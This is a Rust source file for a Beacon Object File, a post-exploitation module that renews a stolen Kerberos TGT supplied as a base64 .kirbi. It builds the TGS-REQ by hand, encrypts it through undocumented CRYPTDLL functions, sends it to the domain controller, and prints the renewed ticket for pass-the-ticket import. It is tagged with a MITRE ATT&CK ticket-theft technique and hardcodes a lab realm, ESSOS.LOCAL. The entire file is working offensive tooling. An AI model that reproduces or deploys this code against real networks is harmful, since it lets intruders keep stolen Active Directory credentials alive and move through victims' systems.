//! # Renew BOF
//!
//! Renews an existing Kerberos TGT via TGS-REQ with the RENEW flag set.
//! Uses the same AP-REQ construction as asktgs targeting krbtgt.
//!
//! ## MITRE ATT&CK
//! - T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
//!
//! ## Arguments
//! - `/ticket:BASE64` - Base64-encoded TGT .kirbi (required)
//! - `/dc:DC` - Domain controller hostname or IP (auto-detected if omitted)
//! - `/ptt` - Import renewed ticket into current session

#![no_std]

use alloc::string::String;
use alloc::vec;
use alloc::vec::Vec;
use core::ffi::c_void;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::Networking::WinSock::*;

unsafe extern "system" {
    fn LoadLibraryA(name: *const u8) -> *mut c_void;
    fn GetProcAddress(module: *mut c_void, name: *const u8) -> *mut c_void;
    fn GetModuleHandleA(name: *const u8) -> *mut c_void;
    fn GetSystemTime(st: *mut SYSTEMTIME);
}


fn asn_tl(tag: u8, data: &[u8]) -> Vec<u8> { let mut o = vec![tag]; let l = data.len(); if l < 0x80 { o.push(l as u8); } else if l < 0x100 { o.push(0x81); o.push(l as u8); } else { o.push(0x82); o.push((l >> 8) as u8); o.push(l as u8); } o.extend_from_slice(data); o }
fn asn_seq(c: &[&[u8]]) -> Vec<u8> { let mut d = Vec::new(); for x in c { d.extend_from_slice(x); } asn_tl(0x30, &d) }
fn asn_ctx(t: u8, d: &[u8]) -> Vec<u8> { asn_tl(0xa0 | t, d) }
fn asn_app(t: u8, d: &[u8]) -> Vec<u8> { asn_tl(0x60 | t, d) }
fn asn_int(v: i64) -> Vec<u8> { if v == 0 { return vec![0x02, 0x01, 0x00]; } let mut b = Vec::new(); let mut val = v; if v > 0 { while val > 0 { b.push((val & 0xff) as u8); val >>= 8; } b.reverse(); if b[0] & 0x80 != 0 { b.insert(0, 0); } } else { while val < -1 { b.push((val & 0xff) as u8); val >>= 8; } b.push((val & 0xff) as u8); b.reverse(); } let mut o = vec![0x02, b.len() as u8]; o.extend_from_slice(&b); o }
fn asn_str(s: &str) -> Vec<u8> { asn_tl(0x1b, s.as_bytes()) }
fn asn_bit(d: &[u8]) -> Vec<u8> { let mut o = vec![0x03]; let l = d.len() + 1; if l < 0x80 { o.push(l as u8); } else { o.push(0x81); o.push(l as u8); } o.push(0x00); o.extend_from_slice(d); o }
fn asn_time(s: &str) -> Vec<u8> { asn_tl(0x18, s.as_bytes()) }
fn asn_oct(d: &[u8]) -> Vec<u8> { asn_tl(0x04, d) }
fn asn_ctx_int(t: u8, v: i64) -> Vec<u8> { let i = asn_int(v); asn_ctx(t, &i) }
fn asn_ctx_str(t: u8, s: &str) -> Vec<u8> { let v = asn_str(s); asn_ctx(t, &v) }

struct Asn { class: u8, tag: u32, value: Vec<u8>, children: Vec<Asn> }
fn parse_asn(data: &[u8]) -> Option<Asn> { let (e, _) = parse_one(data, 0)?; Some(e) }
fn parse_one(data: &[u8], mut pos: usize) -> Option<(Asn, usize)> { if pos >= data.len() { return None; } let b = data[pos]; pos += 1; let class = (b >> 6) & 0x03; let constructed = (b & 0x20) != 0; let mut tag = (b & 0x1F) as u32; if tag == 0x1F { tag = 0; loop { if pos >= data.len() { return None; } let b = data[pos]; pos += 1; tag = (tag << 7) | (b & 0x7F) as u32; if b & 0x80 == 0 { break; } } } if pos >= data.len() { return None; } let lb = data[pos]; pos += 1; let length = if lb < 0x80 { lb as usize } else if lb == 0x80 { return None; } else { let n = (lb & 0x7F) as usize; if pos + n > data.len() { return None; } let mut l = 0; for i in 0..n { l = (l << 8) | data[pos + i] as usize; } pos += n; l }; if pos + length > data.len() { return None; } let value = data[pos..pos + length].to_vec(); let children = if constructed { parse_children(&value) } else { Vec::new() }; Some((Asn { class, tag, value, children }, pos + length)) }
fn parse_children(data: &[u8]) -> Vec<Asn> { let mut c = Vec::new(); let mut p = 0; while p < data.len() { if let Some((ch, np)) = parse_one(data, p) { c.push(ch); p = np; } else { break; } } c }
fn find_ctx<'a>(asn: &'a Asn, tag: u32) -> Option<&'a Asn> { asn.children.iter().find(|c| c.class == 2 && c.tag == tag) }
fn get_int(asn: &Asn) -> i64 { let d = &asn.value; if d.is_empty() { return 0; } let mut v = if d[0] & 0x80 != 0 { -1i64 } else { 0i64 }; for &b in d { v = (v << 8) | b as i64; } v }
fn get_string(asn: &Asn) -> String { String::from_utf8_lossy(&asn.value).into_owned() }


const RC4_HMAC: i32 = 23;
const AES256_CTS: i32 = 18;
const AES128_CTS: i32 = 17;
const KRB_KEY_USAGE_TGS_REQ_PA_AUTHENTICATOR: u32 = 7;
const KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY: u32 = 8;

type InitializeFn = unsafe extern "system" fn(*const u8, u32, u32, *mut *mut c_void) -> i32;
type EncryptFn = unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u8, *mut u32) -> i32;
type DecryptFn = unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u8, *mut u32) -> i32;
type FinishFn = unsafe extern "system" fn(*mut *mut c_void) -> i32;

#[repr(C)]
struct KerbEcrypt {
    encryption_type: u32, block_size: u32, exportable_encryption_type: u32,
    key_size: u32, header_size: u32, preferred_checksum: u32, attributes: u32,
    name: *const u16, initialize: InitializeFn, encrypt: EncryptFn,
    decrypt: DecryptFn, finish: FinishFn, hash_password: *const c_void,
    random_key: *const c_void, control: *const c_void,
    unk0: *const c_void, unk1: *const c_void, unk2: *const c_void,
}

type CDLocateCSystemFn = unsafe extern "system" fn(i32, *mut *const KerbEcrypt) -> i32;
type SystemFunction036Fn = unsafe extern "system" fn(*mut u8, u32) -> u8;

struct CryptApi { cd_locate: CDLocateCSystemFn, rand: SystemFunction036Fn }

fn load_crypt_api() -> Option<CryptApi> {
    unsafe {
        let cryptdll = { let h = GetModuleHandleA(b"CRYPTDLL\0".as_ptr()); if h.is_null() { LoadLibraryA(b"CRYPTDLL\0".as_ptr()) } else { h } };
        if cryptdll.is_null() { return None; }
        let advapi = { let h = GetModuleHandleA(b"ADVAPI32\0".as_ptr()); if h.is_null() { LoadLibraryA(b"ADVAPI32\0".as_ptr()) } else { h } };
        if advapi.is_null() { return None; }
        let cd = GetProcAddress(cryptdll, b"CDLocateCSystem\0".as_ptr());
        let sf = GetProcAddress(advapi, b"SystemFunction036\0".as_ptr());
        if cd.is_null() || sf.is_null() { return None; }
        Some(CryptApi { cd_locate: core::mem::transmute(cd), rand: core::mem::transmute(sf) })
    }
}

fn encrypt_data(api: &CryptApi, key: &[u8], etype: i32, key_usage: u32, plaintext: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let mut csys: *const KerbEcrypt = core::ptr::null();
        if (api.cd_locate)(etype, &mut csys) < 0 || csys.is_null() { return None; }
        let mut ctx: *mut c_void = core::ptr::null_mut();
        if ((*csys).initialize)(key.as_ptr(), (*csys).key_size, key_usage, &mut ctx) < 0 { return None; }
        let mut out_size = plaintext.len();
        let bs = (*csys).block_size as usize;
        if bs > 0 { let m = out_size % bs; if m != 0 { out_size += bs - m; } }
        out_size += (*csys).header_size as usize;
        let out_size = out_size;
        let mut output = vec![0u8; out_size];
        let mut actual = out_size as u32;
        let r = ((*csys).encrypt)(ctx, plaintext.as_ptr(), plaintext.len() as u32, output.as_mut_ptr(), &mut actual);
        ((*csys).finish)(&mut ctx);
        if r >= 0 { output.truncate(actual as usize); Some(output) } else { None }
    }
}

fn decrypt_data(api: &CryptApi, key: &[u8], etype: i32, key_usage: u32, ciphertext: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let mut csys: *const KerbEcrypt = core::ptr::null();
        if (api.cd_locate)(etype, &mut csys) < 0 || csys.is_null() { return None; }
        let mut ctx: *mut c_void = core::ptr::null_mut();
        if ((*csys).initialize)(key.as_ptr(), (*csys).key_size, key_usage, &mut ctx) < 0 { return None; }
        let mut output = vec![0u8; ciphertext.len()];
        let mut actual = ciphertext.len() as u32;
        let r = ((*csys).decrypt)(ctx, ciphertext.as_ptr(), ciphertext.len() as u32, output.as_mut_ptr(), &mut actual);
        ((*csys).finish)(&mut ctx);
        if r >= 0 { output.truncate(actual as usize); Some(output) } else { None }
    }
}


fn send_to_kdc(server: &str, data: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let mut wsa = core::mem::zeroed::<WSADATA>();
        WSAStartup(0x0202, &mut wsa);
        let mut sc = Vec::with_capacity(server.len() + 1); sc.extend_from_slice(server.as_bytes()); sc.push(0);
        let mut hints = core::mem::zeroed::<ADDRINFOA>(); hints.ai_family = AF_INET as i32; hints.ai_socktype = SOCK_STREAM as i32; hints.ai_protocol = IPPROTO_TCP as i32;
        let mut result: *mut ADDRINFOA = core::ptr::null_mut();
        if getaddrinfo(sc.as_ptr(), b"88\0".as_ptr(), &hints, &mut result) != 0 { WSACleanup(); return None; }
        let mut sock: SOCKET = INVALID_SOCKET; let mut ptr = result;
        while !ptr.is_null() { let ai = &*ptr; sock = socket(ai.ai_family, ai.ai_socktype, ai.ai_protocol); if sock != INVALID_SOCKET { if connect(sock, ai.ai_addr, ai.ai_addrlen as i32) == 0 { break; } closesocket(sock); sock = INVALID_SOCKET; } ptr = ai.ai_next; }
        freeaddrinfo(result);
        if sock == INVALID_SOCKET { WSACleanup(); return None; }
        let lb = (data.len() as u32).to_be_bytes();
        send(sock, lb.as_ptr(), 4, 0); send(sock, data.as_ptr(), data.len() as i32, 0);
        let mut sb = [0u8; 4];
        if recv(sock, sb.as_mut_ptr(), 4, 0) < 4 { closesocket(sock); WSACleanup(); return None; }
        let rs = (u32::from_be_bytes(sb) & 0x7fffffff) as usize;
        if rs == 0 || rs > 1024 * 1024 { closesocket(sock); WSACleanup(); return None; }
        let mut resp = vec![0u8; rs]; let mut rcvd = 0;
        while rcvd < rs { let n = recv(sock, resp.as_mut_ptr().add(rcvd), (rs - rcvd) as i32, 0); if n <= 0 { break; } rcvd += n as usize; }
        closesocket(sock); WSACleanup();
        if rcvd == rs { Some(resp) } else { None }
    }
}


fn base64_encode(input: &[u8]) -> String {
    const C: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let ol = 4 * ((input.len() + 2) / 3);
    let mut o = Vec::with_capacity(ol);
    let mut i = 0;
    while i < input.len() {
        let a = input[i] as u32; i += 1;
        let b = if i < input.len() { let v = input[i] as u32; i += 1; v } else { i += 1; 0 };
        let c = if i < input.len() { let v = input[i] as u32; i += 1; v } else { i += 1; 0 };
        let t = (a << 16) | (b << 8) | c;
        o.push(C[((t >> 18) & 0x3F) as usize]); o.push(C[((t >> 12) & 0x3F) as usize]);
        o.push(C[((t >> 6) & 0x3F) as usize]); o.push(C[(t & 0x3F) as usize]);
    }
    match input.len() % 3 { 1 => { if ol >= 2 { o[ol-1] = b'='; o[ol-2] = b'='; } } 2 => { if ol >= 1 { o[ol-1] = b'='; } } _ => {} }
    unsafe { String::from_utf8_unchecked(o) }
}

fn base64_decode(input: &str) -> Option<Vec<u8>> {
    let input = input.as_bytes();
    let mut padding = 0;
    if input.is_empty() { return None; }
    if input[input.len()-1] == b'=' { padding += 1; }
    if input.len() > 1 && input[input.len()-2] == b'=' { padding += 1; }
    let ol = (input.len() * 3) / 4 - padding;
    let mut o = Vec::with_capacity(ol);
    let mut i = 0;
    while i < input.len() {
        let a = b64v(input[i]); i += 1;
        let b = if i < input.len() { b64v(input[i]) } else { 0 }; i += 1;
        let c = if i < input.len() { b64v(input[i]) } else { 0 }; i += 1;
        let d = if i < input.len() { b64v(input[i]) } else { 0 }; i += 1;
        let t = (a << 18) | (b << 12) | (c << 6) | d;
        if o.len() < ol { o.push(((t >> 16) & 0xFF) as u8); }
        if o.len() < ol { o.push(((t >> 8) & 0xFF) as u8); }
        if o.len() < ol { o.push((t & 0xFF) as u8); }
    }
    Some(o)
}
fn b64v(c: u8) -> u32 { match c { b'A'..=b'Z' => (c - b'A') as u32, b'a'..=b'z' => (c - b'a' + 26) as u32, b'0'..=b'9' => (c - b'0' + 52) as u32, b'+' => 62, b'/' => 63, _ => 0 } }


fn get_domain_info() -> Option<(String, String)> {
    unsafe {
        let netapi = { let h = GetModuleHandleA(b"NETAPI32\0".as_ptr()); if h.is_null() { LoadLibraryA(b"NETAPI32\0".as_ptr()) } else { h } };
        if netapi.is_null() { return None; }
        #[repr(C)] struct DcInfo { dc_name: *mut u8, dc_addr: *mut u8, t: u32, g: [u8;16], domain: *mut u8, forest: *mut u8, flags: u32, site: *mut u8, cs: *mut u8 }
        type DsFn = unsafe extern "system" fn(*const u8,*const u8,*const c_void,*const u8,u32,*mut *mut DcInfo) -> u32;
        type FrFn = unsafe extern "system" fn(*mut c_void) -> u32;
        let ds: DsFn = core::mem::transmute(GetProcAddress(netapi, b"DsGetDcNameA\0".as_ptr()));
        let fr: FrFn = core::mem::transmute(GetProcAddress(netapi, b"NetApiBufferFree\0".as_ptr()));
        let mut info: *mut DcInfo = core::ptr::null_mut();
        if ds(core::ptr::null(),core::ptr::null(),core::ptr::null(),core::ptr::null(),0x40000010,&mut info) != 0 { return None; }
        if info.is_null() { return None; }
        fn cs(p: *const u8) -> String { if p.is_null() { return String::new(); } unsafe { let mut l = 0; while *p.add(l) != 0 { l += 1; } String::from_utf8_lossy(core::slice::from_raw_parts(p, l)).into_owned() } }
        let d = cs((*info).domain); let dc = cs((*info).dc_name); fr(info as *mut c_void);
        Some((d, String::from(dc.trim_start_matches('\\'))))
    }
}


fn get_param<'a>(params: &'a str, name: &str) -> Option<&'a str> { if let Some(pos) = params.find(name) { let a = &params[pos + name.len()..]; let e = a.find(' ').unwrap_or(a.len()); let v = &a[..e]; if !v.is_empty() { return Some(v); } } None }

fn get_current_time() -> String {
    unsafe { let mut st = core::mem::zeroed::<SYSTEMTIME>(); GetSystemTime(&mut st); alloc::format!("{:04}{:02}{:02}{:02}{:02}{:02}Z", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond) }
}

fn get_future_time(hours: u16) -> String {
    unsafe { let mut st = core::mem::zeroed::<SYSTEMTIME>(); GetSystemTime(&mut st); st.wHour += hours; if st.wHour >= 24 { st.wHour -= 24; st.wDay += 1; } alloc::format!("{:04}{:02}{:02}{:02}{:02}{:02}Z", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond) }
}


struct KirbiInfo {
    session_key: Vec<u8>,
    key_type: i32,
    username: String,
    realm: String,
    ticket_raw: Vec<u8>,
}

fn parse_kirbi(kirbi_b64: &str) -> Option<KirbiInfo> {
    let bytes = base64_decode(kirbi_b64)?;
    let root = parse_asn(&bytes)?;

    let body = if root.class == 1 && root.tag == 22 { root.children.first()? } else { &root };

    let ticket_ctx = find_ctx(body, 2)?;
    let ticket_seq = ticket_ctx.children.first()?;
    let first_ticket = ticket_seq.children.first()?;
    let ticket_raw = asn_tl(0x60 | first_ticket.tag as u8, &first_ticket.value);

    let enc_part_ctx = find_ctx(body, 3)?;
    let enc_data_seq = enc_part_ctx.children.first()?;
    let cipher_ctx = find_ctx(enc_data_seq, 2)?;
    let cipher = cipher_ctx.children.first()?;
    let enc_cred_part = parse_asn(&cipher.value)?;

    let inner = if enc_cred_part.class == 1 { enc_cred_part.children.first()? } else { &enc_cred_part };
    let ti_ctx = find_ctx(inner, 0)?;
    let ti_seq = ti_ctx.children.first()?;
    let first = ti_seq.children.first()?;

    let key_ctx = find_ctx(first, 0)?;
    let key_seq = key_ctx.children.first()?;
    let key_type = find_ctx(key_seq, 0).and_then(|c| c.children.first()).map(|c| get_int(c) as i32).unwrap_or(0);
    let key_value = find_ctx(key_seq, 1).and_then(|c| c.children.first()).map(|c| c.value.clone()).unwrap_or_default();

    let realm = find_ctx(first, 1).and_then(|c| c.children.first()).map(|c| get_string(c)).unwrap_or_default();

    let username = find_ctx(first, 2).and_then(|c| c.children.first()).and_then(|seq| {
        find_ctx(seq, 1).and_then(|c| c.children.first()).and_then(|s| s.children.first()).map(|c| get_string(c))
    }).unwrap_or_default();

    Some(KirbiInfo { session_key: key_value, key_type, username, realm, ticket_raw })
}


fn build_tgs_req(api: &CryptApi, kirbi: &KirbiInfo, service: &str, domain: &str) -> Option<Vec<u8>> {
    let mut nonce = [0u8; 4];
    unsafe { (api.rand)(nonce.as_mut_ptr(), 4); }
    let nonce_val = u32::from_le_bytes(nonce) as i64;

    let kdc_opts = 0x40810010u32.to_be_bytes(); // forwardable|renewable|canonicalize|renewable-ok

    let parts: Vec<&str> = service.split('/').collect();
    let sname = if parts.len() >= 2 {
        asn_seq(&[&asn_ctx_int(0, 2), &asn_ctx(1, &asn_seq(&[&asn_str(parts[0]), &asn_str(parts[1])]))])
    } else {
        asn_seq(&[&asn_ctx_int(0, 1), &asn_ctx(1, &asn_seq(&[&asn_str(service)]))])
    };

    let till = get_future_time(24);
    let etypes = asn_seq(&[&asn_int(23), &asn_int(18), &asn_int(17)]);

    let req_body = asn_seq(&[
        &asn_ctx(0, &asn_bit(&kdc_opts)),
        &asn_ctx_str(2, &kirbi.realm),
        &asn_ctx(3, &sname),
        &asn_ctx(5, &asn_time(&till)),
        &asn_ctx_int(7, nonce_val),
        &asn_ctx(8, &etypes),
    ]);

    let now = get_current_time();
    let mut cusec_bytes = [0u8; 4];
    unsafe { (api.rand)(cusec_bytes.as_mut_ptr(), 4); }
    let cusec = (u32::from_le_bytes(cusec_bytes) % 999999) as i64;
    let mut seq_bytes = [0u8; 4];
    unsafe { (api.rand)(seq_bytes.as_mut_ptr(), 4); }
    let seq_num = u32::from_le_bytes(seq_bytes) as i64;
    let cname = asn_seq(&[&asn_ctx_int(0, 1), &asn_ctx(1, &asn_seq(&[&asn_str(&kirbi.username)]))]);
    let authenticator = asn_app(2, &asn_seq(&[
        &asn_ctx_int(0, 5),
        &asn_ctx_str(1, &kirbi.realm),
        &asn_ctx(2, &cname),
        &asn_ctx_int(4, cusec),
        &asn_ctx(5, &asn_time(&now)),
        &asn_ctx_int(7, seq_num),
    ]));

    let enc_authenticator = encrypt_data(api, &kirbi.session_key, kirbi.key_type, KRB_KEY_USAGE_TGS_REQ_PA_AUTHENTICATOR, &authenticator)?;

    let ap_req = asn_app(14, &asn_seq(&[
        &asn_ctx_int(0, 5),
        &asn_ctx_int(1, 14),
        &asn_ctx(2, &asn_bit(&[0u8; 4])),
        &asn_ctx(3, &kirbi.ticket_raw),
        &asn_ctx(4, &asn_seq(&[
            &asn_ctx_int(0, kirbi.key_type as i64),
            &asn_ctx(2, &asn_oct(&enc_authenticator)),
        ])),
    ]));

    let ap_req_bytes = ap_req;

    let pa_ap_req = asn_seq(&[
        &asn_ctx_int(1, 1),
        &asn_ctx(2, &asn_oct(&ap_req_bytes)),
    ]);

    let tgs_req = asn_app(12, &asn_seq(&[
        &asn_ctx_int(1, 5),
        &asn_ctx_int(2, 12),
        &asn_ctx(3, &asn_seq(&[&pa_ap_req])),
        &asn_ctx(4, &req_body),
    ]));

    Some(tgs_req)
}


fn handle_tgs_rep(api: &CryptApi, response: &[u8], kirbi: &KirbiInfo) -> Option<String> {
    let root = parse_asn(response)?;

    if root.tag == 30 {
        let body = root.children.first()?;
        if let Some(err) = find_ctx(body, 6) {
            if let Some(code) = err.children.first() {
                eprintln!("\n\t[X] Kerberos error: {}", get_int(code));
            }
        }
        return None;
    }

    if root.tag != 13 { eprintln!("[X] Unexpected response tag: {}", root.tag); return None; }

    let body = root.children.first()?;
    let crealm = find_ctx(body, 3).and_then(|c| c.children.first()).map(|c| get_string(c)).unwrap_or_default();
    let ticket_ctx = find_ctx(body, 5)?;
    let ticket_raw = &ticket_ctx.value;

    let enc_part_ctx = find_ctx(body, 6)?;
    let enc_data_seq = enc_part_ctx.children.first()?;
    let cipher = find_ctx(enc_data_seq, 2).and_then(|c| c.children.first()).map(|c| c.value.clone())?;

    let plaintext = decrypt_data(api, &kirbi.session_key, kirbi.key_type, KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, &cipher)?;
    let dec_asn = parse_asn(&plaintext)?;
    let enc_rep = dec_asn.children.first()?;

    let sk_ctx = find_ctx(enc_rep, 0)?;
    let sk_seq = sk_ctx.children.first()?;
    let sk_type = find_ctx(sk_seq, 0).and_then(|c| c.children.first()).map(|c| get_int(c)).unwrap_or(0);
    let sk_value = find_ctx(sk_seq, 1).and_then(|c| c.children.first()).map(|c| c.value.clone()).unwrap_or_default();

    let flags_raw = find_ctx(enc_rep, 5).and_then(|c| c.children.first()).map(|c| c.value.clone()).unwrap_or_default();
    let starttime = find_ctx(enc_rep, 6).and_then(|c| c.children.first()).map(|c| get_string(c)).unwrap_or_default();
    let endtime = find_ctx(enc_rep, 7).and_then(|c| c.children.first()).map(|c| get_string(c)).unwrap_or_default();
    let renew_till = find_ctx(enc_rep, 8).and_then(|c| c.children.first()).map(|c| get_string(c)).unwrap_or_default();
    let srealm = find_ctx(enc_rep, 9).and_then(|c| c.children.first()).map(|c| get_string(c)).unwrap_or_default();

    let cname_ctx = find_ctx(body, 4)?;
    let cname_raw = &cname_ctx.value;
    let sname_raw = find_ctx(enc_rep, 10).map(|c| &c.value);

    let session_key_asn = asn_ctx(0, &asn_seq(&[&asn_ctx_int(0, sk_type), &asn_ctx(1, &asn_oct(&sk_value))]));
    let prealm_asn = asn_ctx_str(1, &crealm);
    let pname_asn = asn_ctx(2, cname_raw);
    let flags_asn = if !flags_raw.is_empty() { asn_ctx(3, &flags_raw) } else { Vec::new() };
    let start_asn = if !starttime.is_empty() { asn_ctx(6, &asn_time(&starttime)) } else { Vec::new() };
    let end_asn = asn_ctx(7, &asn_time(&endtime));
    let renew_asn = if !renew_till.is_empty() { asn_ctx(8, &asn_time(&renew_till)) } else { Vec::new() };
    let srealm_asn = asn_ctx_str(9, &srealm);
    let sname_asn = if let Some(sr) = sname_raw { asn_ctx(10, sr) } else { Vec::new() };

    let mut parts: Vec<&[u8]> = Vec::new();
    parts.push(&session_key_asn); parts.push(&prealm_asn); parts.push(&pname_asn);
    if !flags_asn.is_empty() { parts.push(&flags_asn); }
    if !start_asn.is_empty() { parts.push(&start_asn); }
    parts.push(&end_asn);
    if !renew_asn.is_empty() { parts.push(&renew_asn); }
    parts.push(&srealm_asn);
    if !sname_asn.is_empty() { parts.push(&sname_asn); }

    let cred_info = asn_seq(&parts);
    let enc_krb_cred_part = asn_app(29, &asn_seq(&[&asn_ctx(0, &asn_seq(&[&cred_info]))]));
    let enc_data = asn_seq(&[&asn_ctx_int(0, 0), &asn_ctx(2, &asn_oct(&enc_krb_cred_part))]);
    let ticket_app = asn_tl(0x61, ticket_raw);
    let krb_cred = asn_app(22, &asn_seq(&[&asn_ctx_int(0, 5), &asn_ctx_int(1, 22), &asn_ctx(2, &asn_seq(&[&ticket_app])), &asn_ctx(3, &enc_data)]));

    Some(base64_encode(&krb_cred))
}


#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    println!("[*] Action: Renew TGT\n");

    if len == 0 { eprintln!("[X] /ticket:BASE64 required"); return; }

    let mut parser = DataParser::new(args, len);
    let params = String::from(parser.get_str());

    let ticket_b64 = match get_param(&params, "/ticket:") { Some(t) => t, None => { eprintln!("[X] /ticket:BASE64 must be supplied!"); return; } };
    let domain_arg = get_param(&params, "/domain:");
    let dc_arg = get_param(&params, "/dc:");
    let ptt = params.contains("/ptt");

    let kirbi = match parse_kirbi(ticket_b64) {
        Some(k) => k,
        None => { eprintln!("[X] Failed to parse .kirbi ticket"); return; }
    };

    let (domain, dc) = if let (Some(d), Some(c)) = (domain_arg, dc_arg) {
        (String::from(d), String::from(c))
    } else {
        match get_domain_info() {
            Some((d, c)) => (domain_arg.map(String::from).unwrap_or(d), dc_arg.map(String::from).unwrap_or(c)),
            None => { eprintln!("[X] /dc:DC must be supplied!"); return; }
        }
    };

    let api = match load_crypt_api() { Some(a) => a, None => { eprintln!("[X] Failed to load crypto"); return; } };

    println!("[*] Renewing TGT for: {}@{}", kirbi.username, kirbi.realm);
    println!("[*] Using TGT for: {}@{}", kirbi.username, kirbi.realm);

    let tgs_req = match build_tgs_req(&api, &kirbi, "krbtgt/ESSOS.LOCAL", &kirbi.realm) {
        Some(r) => r,
        None => { eprintln!("[X] Failed to build TGS-REQ"); return; }
    };

    let response = match send_to_kdc(&dc, &tgs_req) {
        Some(r) => r,
        None => { eprintln!("[X] Failed to communicate with KDC at {}:88", dc); return; }
    };

    match handle_tgs_rep(&api, &response, &kirbi) {
        Some(ticket) => {
            println!("[+] TGT renewal successful!");
            println!("[*] base64(ticket.kirbi):\n\n{}\n", ticket);
            if ptt { println!("[*] /ptt: use the ptt BOF to import this ticket"); }
        }
        None => {}
    }
}
